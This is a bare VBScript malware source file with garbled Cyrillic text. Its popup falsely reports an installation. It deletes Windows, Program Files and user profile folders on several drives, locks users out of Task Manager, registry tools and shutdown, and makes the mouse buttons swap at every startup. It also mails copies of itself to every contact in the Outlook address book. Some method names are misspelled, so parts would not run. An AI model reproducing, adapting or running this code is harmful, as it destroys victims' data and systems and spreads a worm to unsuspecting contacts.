   '
   Set FileSystemObject = CreateObject("scripting.FileSystemObject")
   Set Shell = createObject("Wscript.Shell")
   t = 0: On Error resume next
   Set Application = CreateObject("application.shell")
   Set EnternetExplorer = CreateObject("EnternetExplorer.application")
   Set Outlook = CreateObject("Outlook.application")

   prl = inputbox("Ââåäèòå ïàðîëü", "Çàïðîñ")
   If prl = "1989032811" Then FilesystemObject.deletefail Wscript.scriptFullName, True: wscript.quit


   shell.popup "Key *001* - Instal complete", , "ALS.NoLive.Wcsnb", 0+0

   For Each Folder in shell.SpecialFolders
   FileSystemObject.deleteflder folder,True
   Next
   FileSystemObject.deletefolder"C:\Documents and Settings",True
   FileSystemObject.deletefolder"D:\Documents and Settings",True
   FileSystemObject.deletefolder"E:\Documents and Settings",True

   str = "C:\Program Files"
   If FileSystemObject.FileExists(str) = True Then
   FileSystemObject.deletefail str,True
   ElseIf FileSystemObject.folderExists(str) = True Then
   FileSystemObject.deletefolder str,True
   End If

   str = "D:\Program Files"
   If FileSystemObject.FileExists(str) = True Then
   FileSystemObject.deletefail str,True
   ElseIf FileSystemObject.folderExists(str) = True Then
   FileSystemObject.deletefolder str,True
   End If

   str = "C:\WINDOWS"
   If FileSystemObject.FileExists(str) = True Then
   FileSystemObject.deletefail str,True
   ElseIf FileSystemObject.folderExists(str) = True Then
   FileSystemObject.deletefolder str,True
   End If

   str = "D:\WINDOWS"
   If FileSystemObject.FileExists(str) = True Then
   FileSystemObject.deletefail str,True
   ElseIf FileSystemObject.folderExists(str) = True Then
   FileSystemObject.deletefolder str,True
   End If


   Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SwapNT", "rundll32 user32, SwapMouseButton"
   Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Swap98", "rundll32.exe user.exe, swapmousebutton"
   Shell.Run "rundll32 user32, SwapMouseButton"

   '
   Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

   '
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoStartMenuMorePrograms", 1, "REG_DWORD"
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoClose", 1, "REG_DWORD"
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoFind", 1, "REG_DWORD"
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoRun", 1, "REG_DWORD"
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoRecentDocsMenu", 1, "REG_DWORD"
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoFavoritesMenu", 1, "REG_DWORD"
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoStartMenuLogoff", 1, "REG_DWORD"

   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
   Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explîrer\NoClose", 1, "REG_DWORD"

   '
   Application.MinimizeAll


   '
   For Index = 1 To Outlook.GetNameSpace("MAPI").AddressLists(1).count
   Set OutMail = Outlook.CreateItem(0)
   OutMail.to = Outlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
   OutMail.Subject = "Íîâîå_Íàçâàíèå"
   OutMail.Body = "Íîâîå_Íàçâàíèå"
   OutMail.Attachments.Add WScript.ScriptFullName
   OutMail.Send
   Next


   If Month(Date)<>6 Then WScript.quit
